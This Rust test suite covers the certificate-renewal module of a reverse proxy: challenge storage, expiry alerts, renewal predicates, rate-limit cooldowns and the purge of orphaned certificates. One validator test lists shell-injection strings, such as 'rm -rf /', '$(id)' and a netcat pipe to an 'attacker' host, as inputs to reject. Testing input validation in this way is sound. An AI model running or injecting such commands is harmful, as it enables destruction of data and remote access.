// Copyright 2026 Rwx-G (Lorica)
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
// http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

//! Test suite for the management-plane side of the `acme` module: the
//! SQLite challenge store, the pending manual DNS-01 state, the expiry
//! alerting task, and the pure renewal predicates. The pure ACME core
//! (config, DNS challengers, protocol driver) is tested in `lorica-acme`.

use std::sync::Arc;
use std::time::Instant;

use dashmap::DashMap;

use super::dns01_manual::PENDING_DNS_MAX_AGE;
use super::expiry::check_cert_expiry;
use super::store::AcmeChallengeStore;
use super::types::{PendingDnsChallenge, PendingDnsChallenges};

fn temp_challenge_store() -> AcmeChallengeStore {
    let dir = tempfile::tempdir().expect("tempdir available for test");
    let db_path = dir.keep().join("test-acme.db");
    // Since Story 9.1 AC #10 the `acme_challenges` table is owned by
    // lorica-config migration v47; mirror production, where
    // ConfigStore::open runs migrations on the shared file before the
    // challenge store attaches to it.
    drop(lorica_config::ConfigStore::open(&db_path, None).expect("config store migrates the db"));
    AcmeChallengeStore::with_db_path(db_path)
}

#[tokio::test]
async fn test_challenge_store_set_get_remove() {
    let store = temp_challenge_store();
    store
        .set("token1".into(), "auth1".into())
        .await
        .expect("challenge persists");
    assert_eq!(store.get("token1").await, Some("auth1".to_string()));
    store.remove("token1").await;
    assert_eq!(store.get("token1").await, None);
}

#[tokio::test]
async fn test_challenge_store_get_nonexistent() {
    let store = temp_challenge_store();
    assert_eq!(store.get("nonexistent").await, None);
}

#[test]
fn test_pending_dns_challenges_store_and_retrieve() {
    let store: PendingDnsChallenges = Arc::new(DashMap::new());
    store.insert(
        "example.com".to_string(),
        PendingDnsChallenge {
            order_url: "https://acme.example/order/1".into(),
            challenge_urls: vec!["https://acme.example/chall/1".into()],
            txt_records: vec![(
                "_acme-challenge.example.com".into(),
                "abc123".into(),
                "example.com".into(),
            )],
            domains: vec!["example.com".into()],
            account_credentials_json: "{}".into(),
            staging: true,
            contact_email: Some("test@example.com".into()),
            created_at: Instant::now(),
        },
    );

    assert!(store.contains_key("example.com"));
    assert!(!store.contains_key("other.com"));

    let (_, pending) = store
        .remove("example.com")
        .expect("challenge was just inserted for example.com");
    assert_eq!(pending.txt_records[0].1, "abc123");
    assert_eq!(pending.challenge_urls[0], "https://acme.example/chall/1");
    assert!(pending.staging);
    assert!(!store.contains_key("example.com"));
}

#[test]
fn test_pending_dns_challenges_multi_domain() {
    let store: PendingDnsChallenges = Arc::new(DashMap::new());
    store.insert(
        "example.com".to_string(),
        PendingDnsChallenge {
            order_url: "https://acme.example/order/2".into(),
            challenge_urls: vec![
                "https://acme.example/chall/1".into(),
                "https://acme.example/chall/2".into(),
            ],
            txt_records: vec![
                (
                    "_acme-challenge.example.com".into(),
                    "val1".into(),
                    "example.com".into(),
                ),
                (
                    "_acme-challenge.example.com".into(),
                    "val2".into(),
                    "*.example.com".into(),
                ),
            ],
            domains: vec!["example.com".into(), "*.example.com".into()],
            account_credentials_json: "{}".into(),
            staging: false,
            contact_email: None,
            created_at: Instant::now(),
        },
    );

    let (_, pending) = store
        .remove("example.com")
        .expect("multi-domain challenge was inserted for example.com");
    assert_eq!(pending.domains.len(), 2);
    assert_eq!(pending.challenge_urls.len(), 2);
    assert_eq!(pending.txt_records.len(), 2);
    // Both TXT records should target the same _acme-challenge name
    assert_eq!(pending.txt_records[0].0, pending.txt_records[1].0);
}

#[test]
fn test_pending_dns_challenge_expiry_check() {
    let pending = PendingDnsChallenge {
        order_url: String::new(),
        challenge_urls: vec![],
        txt_records: vec![],
        domains: vec![],
        account_credentials_json: String::new(),
        staging: false,
        contact_email: None,
        created_at: Instant::now() - std::time::Duration::from_secs(700),
    };
    assert!(pending.created_at.elapsed() > PENDING_DNS_MAX_AGE);
}

#[test]
fn test_pending_dns_challenge_not_expired() {
    let pending = PendingDnsChallenge {
        order_url: String::new(),
        challenge_urls: vec![],
        txt_records: vec![],
        domains: vec![],
        account_credentials_json: String::new(),
        staging: false,
        contact_email: None,
        created_at: Instant::now(),
    };
    assert!(pending.created_at.elapsed() < PENDING_DNS_MAX_AGE);
}

#[tokio::test]
async fn test_check_cert_expiry_dispatches_alerts() {
    use lorica_config::models::{Certificate, GlobalSettings};
    use tokio::sync::Mutex;

    let store =
        lorica_config::ConfigStore::open_in_memory().expect("in-memory ConfigStore should open");

    // Set warning=14, critical=3
    let settings = GlobalSettings {
        cert_warning_days: 14,
        cert_critical_days: 3,
        ..GlobalSettings::default()
    };
    store
        .update_global_settings(&settings)
        .expect("update_global_settings should succeed on fresh store");

    let now = chrono::Utc::now();

    // Cert expiring in 10 days (warning level)
    let warning_cert = Certificate {
        id: "cert-warn".into(),
        domain: "warn.example.com".into(),
        san_domains: vec![],
        fingerprint: "aaa".into(),
        cert_pem: "---CERT---".into(),
        key_pem: "---KEY---".into(),
        issuer: "manual".into(),
        not_before: now - chrono::Duration::days(80),
        not_after: now + chrono::Duration::days(10),
        is_acme: false,
        acme_auto_renew: false,
        created_at: now - chrono::Duration::days(80),
        acme_method: None,

        acme_dns_provider_id: None,
    };

    // Cert expiring in 2 days (critical level)
    let critical_cert = Certificate {
        id: "cert-crit".into(),
        domain: "crit.example.com".into(),
        san_domains: vec![],
        fingerprint: "bbb".into(),
        cert_pem: "---CERT---".into(),
        key_pem: "---KEY---".into(),
        issuer: "manual".into(),
        not_before: now - chrono::Duration::days(88),
        not_after: now + chrono::Duration::days(2),
        is_acme: false,
        acme_auto_renew: false,
        created_at: now - chrono::Duration::days(88),
        acme_method: None,

        acme_dns_provider_id: None,
    };

    // Cert expiring in 30 days (no alert)
    let safe_cert = Certificate {
        id: "cert-safe".into(),
        domain: "safe.example.com".into(),
        san_domains: vec![],
        fingerprint: "ccc".into(),
        cert_pem: "---CERT---".into(),
        key_pem: "---KEY---".into(),
        issuer: "Let's Encrypt".into(),
        not_before: now - chrono::Duration::days(60),
        not_after: now + chrono::Duration::days(30),
        is_acme: true,
        acme_auto_renew: true,
        created_at: now - chrono::Duration::days(60),
        acme_method: Some("http01".into()),

        acme_dns_provider_id: None,
    };

    store
        .create_certificate(&warning_cert)
        .expect("create warning_cert should succeed");
    store
        .create_certificate(&critical_cert)
        .expect("create critical_cert should succeed");
    store
        .create_certificate(&safe_cert)
        .expect("create safe_cert should succeed");

    let state = crate::server::AppState {
        store: Arc::new(Mutex::new(store)),
        log_buffer: Arc::new(crate::logs::LogBuffer::new(100)),
        system_cache: Arc::new(Mutex::new(crate::system::SystemCache::new())),
        active_connections: Arc::new(std::sync::atomic::AtomicU64::new(0)),
        started_at: Instant::now(),
        data_dir: std::path::PathBuf::from("/var/lib/lorica"),
        http_port: 8080,
        https_port: 8443,
        config_reload_tx: None,
        mode: crate::server::Mode::Test,
        waf_event_buffer: None,
        waf_engine: None,
        waf_rule_count: None,
        acme_challenge_store: None,
        pending_dns_challenges: Arc::new(DashMap::new()),
        sla_collector: None,
        load_test_engine: None,
        notification_history: None,
        log_store: None,
        log_writer: None,
        task_tracker: tokio_util::task::TaskTracker::new(),
    };

    let alert_sender = lorica_notify::AlertSender::new(64);
    let mut rx = alert_sender.subscribe();

    check_cert_expiry(&state, &alert_sender).await;

    // Collect all alerts
    let mut alerts = Vec::new();
    while let Ok(event) = rx.try_recv() {
        alerts.push(event);
    }

    // Should have exactly 2 alerts (warning + critical), not 3 (safe cert is >14 days)
    assert_eq!(alerts.len(), 2, "expected 2 alerts, got {}", alerts.len());

    // Find the critical alert
    let crit = alerts
        .iter()
        .find(|a| a.summary.contains("CRITICAL"))
        .expect("should have a CRITICAL alert");
    assert!(crit.summary.contains("crit.example.com"));
    assert_eq!(
        crit.details
            .get("cert_id")
            .expect("test setup: cert_id detail present"),
        "cert-crit"
    );

    // Find the warning alert
    let warn = alerts
        .iter()
        .find(|a| !a.summary.contains("CRITICAL"))
        .expect("should have a warning alert");
    assert!(warn.summary.contains("warn.example.com"));
    assert_eq!(
        warn.details
            .get("cert_id")
            .expect("test setup: cert_id detail present"),
        "cert-warn"
    );
}

// --- is_valid_dns_server ---
//
// The predicate guards the `@server` argument passed to `dig`
// inside `check_txt_record`. A lax whitelist here would turn into
// a shell-injection pivot, so the filter has to reject every
// meta-character we could imagine. Tests are split per intent so
// a regression pinpoints the exact bypass.

use super::dns01_manual::is_valid_dns_server;

#[test]
fn is_valid_dns_server_accepts_ipv4() {
    assert!(is_valid_dns_server("8.8.8.8"));
    assert!(is_valid_dns_server("1.1.1.1"));
    assert!(is_valid_dns_server("192.168.1.1"));
}

#[test]
fn is_valid_dns_server_accepts_ipv6_with_brackets() {
    assert!(is_valid_dns_server("[2001:4860:4860::8888]"));
    assert!(is_valid_dns_server("[::1]"));
}

#[test]
fn is_valid_dns_server_accepts_hostname() {
    assert!(is_valid_dns_server("ns1.example.com"));
    assert!(is_valid_dns_server("dns-02.cloudflare.com"));
}

#[test]
fn is_valid_dns_server_rejects_empty() {
    assert!(!is_valid_dns_server(""));
}

#[test]
fn is_valid_dns_server_rejects_too_long() {
    let too_long = "a".repeat(254);
    assert!(!is_valid_dns_server(&too_long));
}

#[test]
fn is_valid_dns_server_rejects_shell_metacharacters() {
    assert!(!is_valid_dns_server("8.8.8.8; rm -rf /"));
    assert!(!is_valid_dns_server("`whoami`"));
    assert!(!is_valid_dns_server("$(id)"));
    assert!(!is_valid_dns_server("8.8.8.8 && echo pwned"));
    assert!(!is_valid_dns_server("8.8.8.8|nc attacker 1337"));
}

#[test]
fn is_valid_dns_server_rejects_whitespace() {
    assert!(!is_valid_dns_server("8.8.8.8 "));
    assert!(!is_valid_dns_server(" 8.8.8.8"));
    assert!(!is_valid_dns_server("8.8\t8.8"));
}

#[test]
fn is_valid_dns_server_rejects_quotes_and_slashes() {
    assert!(!is_valid_dns_server("'8.8.8.8'"));
    assert!(!is_valid_dns_server("\"8.8.8.8\""));
    assert!(!is_valid_dns_server("8.8.8.8/24"));
    assert!(!is_valid_dns_server("8.8.8.8\\n"));
}

// --- should_auto_renew ---
//
// Pure predicate extracted from the renewal loop so the filtering
// logic can be tested without spinning a background task or
// touching the network. Each test pins one of the four rules so
// a regression says exactly which branch changed.

use super::renewal::should_auto_renew;

fn renewal_cert_fixture(
    now: chrono::DateTime<chrono::Utc>,
    days_until_expiry: i64,
    is_acme: bool,
    auto_renew: bool,
    acme_method: Option<&str>,
) -> lorica_config::models::Certificate {
    lorica_config::models::Certificate {
        id: "cert-fixture".into(),
        domain: "example.com".into(),
        san_domains: vec![],
        fingerprint: "deadbeef".into(),
        cert_pem: "---CERT---".into(),
        key_pem: "---KEY---".into(),
        issuer: "Let's Encrypt".into(),
        not_before: now - chrono::Duration::days(60),
        not_after: now + chrono::Duration::days(days_until_expiry),
        is_acme,
        acme_auto_renew: auto_renew,
        created_at: now - chrono::Duration::days(60),
        acme_method: acme_method.map(String::from),
        acme_dns_provider_id: None,
    }
}

#[test]
fn should_auto_renew_rejects_non_acme() {
    let now = chrono::Utc::now();
    let cert = renewal_cert_fixture(now, 5, false, true, None);
    assert!(!should_auto_renew(&cert, now, 30));
}

#[test]
fn should_auto_renew_rejects_opted_out() {
    let now = chrono::Utc::now();
    let cert = renewal_cert_fixture(now, 5, true, false, Some("http01"));
    assert!(!should_auto_renew(&cert, now, 30));
}

#[test]
fn should_auto_renew_rejects_dns01_manual() {
    let now = chrono::Utc::now();
    let cert = renewal_cert_fixture(now, 5, true, true, Some("dns01-manual"));
    assert!(
        !should_auto_renew(&cert, now, 30),
        "dns01-manual certs must never be auto-renewed, the operator has to confirm the TXT record"
    );
}

#[test]
fn should_auto_renew_accepts_http01_inside_window() {
    let now = chrono::Utc::now();
    let cert = renewal_cert_fixture(now, 10, true, true, Some("http01"));
    assert!(should_auto_renew(&cert, now, 30));
}

#[test]
fn should_auto_renew_accepts_dns01_cloudflare_inside_window() {
    let now = chrono::Utc::now();
    let cert = renewal_cert_fixture(now, 10, true, true, Some("dns01-cloudflare"));
    assert!(should_auto_renew(&cert, now, 30));
}

#[test]
fn should_auto_renew_accepts_exactly_at_threshold() {
    let now = chrono::Utc::now();
    // The cert expires in exactly `threshold_days + 1` hours so
    // `(not_after - now).num_days()` rounds down to `threshold`.
    let not_after = now + chrono::Duration::days(30) + chrono::Duration::hours(1);
    let cert = lorica_config::models::Certificate {
        id: "cert-edge".into(),
        domain: "edge.example.com".into(),
        san_domains: vec![],
        fingerprint: "ff".into(),
        cert_pem: "---CERT---".into(),
        key_pem: "---KEY---".into(),
        issuer: "Let's Encrypt".into(),
        not_before: now - chrono::Duration::days(60),
        not_after,
        is_acme: true,
        acme_auto_renew: true,
        created_at: now - chrono::Duration::days(60),
        acme_method: Some("http01".into()),
        acme_dns_provider_id: None,
    };
    assert!(
        should_auto_renew(&cert, now, 30),
        "cert at exactly the threshold must qualify (predicate is <=, not <)"
    );
}

#[test]
fn should_auto_renew_rejects_outside_window() {
    let now = chrono::Utc::now();
    let cert = renewal_cert_fixture(now, 60, true, true, Some("http01"));
    assert!(!should_auto_renew(&cert, now, 30));
}

#[test]
fn should_auto_renew_accepts_already_expired() {
    let now = chrono::Utc::now();
    // Negative remaining days must still trigger renewal : an
    // expired cert is the most urgent renewal case, not a no-op.
    let cert = renewal_cert_fixture(now, -1, true, true, Some("http01"));
    assert!(should_auto_renew(&cert, now, 30));
}

// --- is_bound (AC2) ---
//
// The renewal loop renews only route-bound certs. The pure
// predicate pins that an unbound cert is skipped regardless of its
// expiry, which is the 2026-06-16 incident root cause.

use std::collections::HashSet;

use super::renewal::is_bound;

#[test]
fn is_bound_true_when_referenced_by_a_route() {
    let bound: HashSet<String> = ["cert-a".to_string(), "cert-b".to_string()]
        .into_iter()
        .collect();
    assert!(is_bound("cert-a", &bound));
}

#[test]
fn is_bound_false_when_not_referenced() {
    let bound: HashSet<String> = ["cert-a".to_string()].into_iter().collect();
    assert!(
        !is_bound("cert-orphan", &bound),
        "an unbound cert must never be picked up by the renewal loop"
    );
}

#[test]
fn is_bound_false_for_empty_set() {
    let bound: HashSet<String> = HashSet::new();
    assert!(!is_bound("cert-a", &bound));
}

// --- cooldown_from_error (AC3) ---
//
// Classifies a Let's Encrypt rate-limit error and extracts the
// retry-after instant so the loop stops re-attempting before the
// quota window reopens. Non-rate-limit errors return None.

use super::renewal::cooldown_from_error;

#[test]
fn cooldown_from_error_parses_real_rate_limit_message() {
    let now = chrono::Utc::now();
    let msg = "too many certificates (5) already issued for this exact set of identifiers \
               in the last 168h0m0s, retry after 2026-06-11 06:19:40 UTC: see \
               https://letsencrypt.org/docs/rate-limits/ \
               (urn:ietf:params:acme:error:rateLimited)";
    let cooldown = cooldown_from_error(msg, now).expect("rate-limit error must yield a cooldown");
    let expected = chrono::DateTime::<chrono::Utc>::from_naive_utc_and_offset(
        chrono::NaiveDateTime::parse_from_str("2026-06-11 06:19:40", "%Y-%m-%d %H:%M:%S")
            .expect("test stamp parses"),
        chrono::Utc,
    );
    assert_eq!(cooldown, expected);
}

#[test]
fn cooldown_from_error_falls_back_to_24h_without_stamp() {
    let now = chrono::Utc::now();
    // Rate-limit URN present but no parseable retry-after stamp.
    let msg = "rateLimited: too many certificates already issued";
    let cooldown =
        cooldown_from_error(msg, now).expect("rate-limit error must yield a cooldown");
    assert_eq!(cooldown, now + chrono::Duration::hours(24));
}

#[test]
fn cooldown_from_error_returns_none_for_non_rate_limit_error() {
    let now = chrono::Utc::now();
    let msg = "certificate poll failed: connection reset by peer";
    assert!(
        cooldown_from_error(msg, now).is_none(),
        "a non-rate-limit error must not record a cooldown"
    );
}

#[test]
fn cooldown_from_error_clamps_far_future_stamp_to_seven_days() {
    let now = chrono::Utc::now();
    // A hostile or buggy ACME endpoint returns a retry-after years out;
    // the cooldown must be clamped to the 7 day quota window so it
    // cannot suspend auto-renewal long enough to let the cert expire.
    let msg = "too many certificates, retry after 2099-01-01 00:00:00 UTC: \
               (urn:ietf:params:acme:error:rateLimited)";
    let cooldown = cooldown_from_error(msg, now).expect("rate-limit error must yield a cooldown");
    assert_eq!(cooldown, now + chrono::Duration::days(7));
}

#[test]
fn cooldown_from_error_falls_back_when_stamp_is_garbage() {
    let now = chrono::Utc::now();
    // `retry after` is present but the stamp does not parse; the safe
    // 24h default applies rather than silently dropping the cooldown.
    let msg = "rateLimited: too many certificates, retry after soon: see docs";
    let cooldown = cooldown_from_error(msg, now).expect("rate-limit error must yield a cooldown");
    assert_eq!(cooldown, now + chrono::Duration::hours(24));
}

// --- in_cooldown (AC3) ---
//
// The loop skips a cert whose cooldown is still in the future. The
// pure predicate pins future -> skip, past -> attempt, absent ->
// attempt, the integrated rate-limit-respect behavior the loop relies
// on (the loop sweeps expired entries before calling this).

use std::collections::HashMap;

use super::renewal::in_cooldown;

#[test]
fn in_cooldown_true_for_future_entry() {
    let now = chrono::Utc::now();
    let mut map: HashMap<String, chrono::DateTime<chrono::Utc>> = HashMap::new();
    map.insert("cert-a".into(), now + chrono::Duration::hours(1));
    assert!(in_cooldown(&map, "cert-a", now));
}

#[test]
fn in_cooldown_false_for_expired_entry() {
    let now = chrono::Utc::now();
    let mut map: HashMap<String, chrono::DateTime<chrono::Utc>> = HashMap::new();
    map.insert("cert-a".into(), now - chrono::Duration::hours(1));
    assert!(
        !in_cooldown(&map, "cert-a", now),
        "an expired cooldown must not suppress a renewal attempt"
    );
}

#[test]
fn in_cooldown_false_when_absent() {
    let now = chrono::Utc::now();
    let map: HashMap<String, chrono::DateTime<chrono::Utc>> = HashMap::new();
    assert!(!in_cooldown(&map, "cert-a", now));
}

// --- superseded_orphans (AC4) ---
//
// Selects ACME certs that are both unbound and superseded by a
// newer sibling for the same identifier set. Unique unbound certs
// and the newest of a duplicate group are kept.

use super::superseded_orphans;

fn orphan_cert_fixture(
    id: &str,
    domain: &str,
    sans: &[&str],
    not_after_days: i64,
) -> lorica_config::models::Certificate {
    let now = chrono::Utc::now();
    lorica_config::models::Certificate {
        id: id.into(),
        domain: domain.into(),
        san_domains: sans.iter().map(|s| (*s).to_string()).collect(),
        fingerprint: "fp".into(),
        cert_pem: "---CERT---".into(),
        key_pem: "---KEY---".into(),
        issuer: "Let's Encrypt".into(),
        not_before: now - chrono::Duration::days(1),
        not_after: now + chrono::Duration::days(not_after_days),
        is_acme: true,
        acme_auto_renew: true,
        created_at: now - chrono::Duration::days(1),
        acme_method: Some("http01".into()),
        acme_dns_provider_id: None,
    }
}

#[test]
fn superseded_orphans_purges_older_unbound_duplicate() {
    // Two unbound certs for the same identity ; only the strictly
    // older one is superseded and must be purged.
    let old = orphan_cert_fixture("cert-old", "mail.example.com", &["mail.example.com"], 10);
    let new = orphan_cert_fixture("cert-new", "mail.example.com", &["mail.example.com"], 80);
    let bound: HashSet<String> = HashSet::new();

    let purge = superseded_orphans(&[old, new], &bound);
    assert_eq!(purge, vec!["cert-old".to_string()]);
}

#[test]
fn superseded_orphans_keeps_bound_cert_even_if_superseded() {
    // The older cert is bound to a route, so it must be kept even
    // though a newer sibling exists.
    let old = orphan_cert_fixture("cert-old", "mail.example.com", &["mail.example.com"], 10);
    let new = orphan_cert_fixture("cert-new", "mail.example.com", &["mail.example.com"], 80);
    let bound: HashSet<String> = ["cert-old".to_string()].into_iter().collect();

    let purge = superseded_orphans(&[old, new], &bound);
    assert!(
        purge.is_empty(),
        "a route-bound cert must never be purged, even when superseded"
    );
}

#[test]
fn superseded_orphans_keeps_unique_unbound_cert() {
    // A lone unbound cert has no newer sibling, so an operator may
    // still bind it ; it must be kept.
    let lone = orphan_cert_fixture("cert-lone", "solo.example.com", &["solo.example.com"], 10);
    let bound: HashSet<String> = HashSet::new();

    let purge = superseded_orphans(&[lone], &bound);
    assert!(purge.is_empty());
}

#[test]
fn superseded_orphans_keeps_newest_of_duplicate_group() {
    // Nothing supersedes the newest cert, so it is not an orphan.
    let old = orphan_cert_fixture("cert-old", "mail.example.com", &["mail.example.com"], 10);
    let new = orphan_cert_fixture("cert-new", "mail.example.com", &["mail.example.com"], 80);
    let bound: HashSet<String> = HashSet::new();

    let purge = superseded_orphans(&[old, new], &bound);
    assert!(!purge.contains(&"cert-new".to_string()));
}

#[test]
fn superseded_orphans_matches_identity_ignoring_san_order() {
    // Same identifier set in a different SAN order must still match,
    // so the older dup is purged.
    let old = orphan_cert_fixture(
        "cert-old",
        "example.com",
        &["www.example.com", "example.com"],
        10,
    );
    let new = orphan_cert_fixture(
        "cert-new",
        "example.com",
        &["example.com", "www.example.com"],
        80,
    );
    let bound: HashSet<String> = HashSet::new();

    let purge = superseded_orphans(&[old, new], &bound);
    assert_eq!(purge, vec!["cert-old".to_string()]);
}

#[test]
fn superseded_orphans_matches_when_primary_absent_from_san_list() {
    // An ACME cert lists the primary inside its SAN set; an uploaded
    // twin omits the primary from its SANs. Both cover the same names,
    // so the union-based identity must match and the older one purge.
    let acme = orphan_cert_fixture(
        "cert-acme",
        "mail.example.com",
        &["mail.example.com", "autodiscover.example.com"],
        10,
    );
    let uploaded = orphan_cert_fixture(
        "cert-uploaded",
        "mail.example.com",
        &["autodiscover.example.com"],
        80,
    );
    let bound: HashSet<String> = HashSet::new();

    let purge = superseded_orphans(&[acme, uploaded], &bound);
    assert_eq!(purge, vec!["cert-acme".to_string()]);
}

#[test]
fn superseded_orphans_keeps_both_on_not_after_tie() {
    // Two unbound certs for the same identity with the EXACT same
    // not_after supersede neither (strict comparison), so both stay.
    let mut a = orphan_cert_fixture("cert-a", "mail.example.com", &["mail.example.com"], 30);
    let mut b = orphan_cert_fixture("cert-b", "mail.example.com", &["mail.example.com"], 30);
    // The fixtures capture `now` independently, so force an exact tie.
    let shared = chrono::Utc::now() + chrono::Duration::days(30);
    a.not_after = shared;
    b.not_after = shared;
    let bound: HashSet<String> = HashSet::new();

    let purge = superseded_orphans(&[a, b], &bound);
    assert!(
        purge.is_empty(),
        "certs tied on not_after supersede neither, so both are kept"
    );
}
